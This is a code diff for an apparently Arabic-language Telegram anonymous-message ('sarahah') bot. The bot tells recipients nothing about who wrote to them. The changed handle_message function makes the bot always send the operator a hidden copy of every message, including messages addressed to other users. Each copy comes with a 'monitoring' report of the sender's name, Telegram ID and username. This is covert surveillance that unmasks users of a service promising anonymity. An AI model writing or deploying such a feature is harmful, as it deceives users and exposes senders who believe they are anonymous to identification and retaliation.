@@ -7,7 +7,7 @@ MY_ADMIN_ID = 8820368378
 # قائمة المحظورين
 blocked_users = set()
 
-# قاموس لتتبع الرابط اللي فاته المستخدم عشان يوصل إرساله للشخص الصح
+# قاموس لتتبع الرابط اللي فاته المستخدم
 user_targets = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -78,7 +78,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("عذراً، أنت محظور ولا يمكنك إرسال رسائل.")
         return
 
-    # تحديد لمن ستروح الرسالة (الشخص المستهدف عبر الرابط، أو إلك كافتراضي لو ما فيه رابط)
+    # تحديد لمن ستروح الرسالة الأساسية
     target_id = user_targets.get(sender_id, MY_ADMIN_ID)
 
     sender_username = f"@{sender.username}" if sender.username else "لا يوجد"
@@ -88,37 +88,27 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # رد للمرسل
     await update.message.reply_text("تم إرسال صراحتك بنجاح 🥷✨")
 
-    # 1. إرسال نص الصراحة فقط للمتلقي الحقيقي (بدون أي معلومات عن المرسل لتبقى سرية عنده)
+    # 1. إرسال الرسالة فقط للشخص المستهدف (بدون أي معلومات عنه نهائياً)
     await context.bot.send_message(
         chat_id=target_id,
         text=f"💌 وصلت صراحة جديدة!\n\n{message_text}"
     )
 
-    # 2. إرسال الرسالة ومعلومات المرسل الكاملة إليكِ أنتِ وحدكِ دائماً (برسالتين منفصلات عندك)
-    # حتى لو الرسالة راحت لحدا ثاني، رح توصلك نسخة مع تقرير كامل بالاسم والأيدي واليوزر إلك إنتِ حصراً
-    if target_id != MY_ADMIN_ID:
-        await context.bot.send_message(
-            chat_id=MY_ADMIN_ID,
-            text=f"📋 [مراقبة البوت] رسالة موجهة إلى ({target_id}):\n\n{message_text}"
-        )
-        await context.bot.send_message(
-            chat_id=MY_ADMIN_ID,
-            text=f"👤 معلومات المرسل:\n"
-                 f"- الاسم: {sender_name}\n"
-                 f"- الأيدي: `{sender_id}`\n"
-                 f"- اليوزر: {sender_username}",
-            parse_mode="Markdown"
-        )
-    else:
-        # لو كانت الرسالة موجهة إلك أصلاً
-        await context.bot.send_message(
-            chat_id=MY_ADMIN_ID,
-            text=f"👤 معلومات المرسل:\n"
-                 f"- الاسم: {sender_name}\n"
-                 f"- الأيدي: `{sender_id}`\n"
-                 f"- اليوزر: {sender_username}",
-            parse_mode="Markdown"
-        )
+    # 2. إرسال المعلومات والتقرير إليكِ أنتِ وحدكِ كمديرة (بغض النظر مين بعث لمن)
+    # الرسالة الأولى إليكِ (نص الصراحة مع توضيح لمن أُرسلت)
+    await context.bot.send_message(
+        chat_id=MY_ADMIN_ID,
+        text=f"📋 [مراقبة البوت] رسالة موجهة إلى ({target_id}):\n\n{message_text}"
+    )
+    # الرسالة الثانية إليكِ وحدكِ (معلومات المرسل الكاملة بـ رسالة مستقلة تماماً)
+    await context.bot.send_message(
+        chat_id=MY_ADMIN_ID,
+        text=f"👤 معلومات المرسل:\n"
+             f"- الاسم: {sender_name}\n"
+             f"- الأيدي: `{sender_id}`\n"
+             f"- اليوزر: {sender_username}",
+        parse_mode="Markdown"
+    )
 
 if __name__ == '__main__':
     application = ApplicationBuilder().token(TOKEN).build()
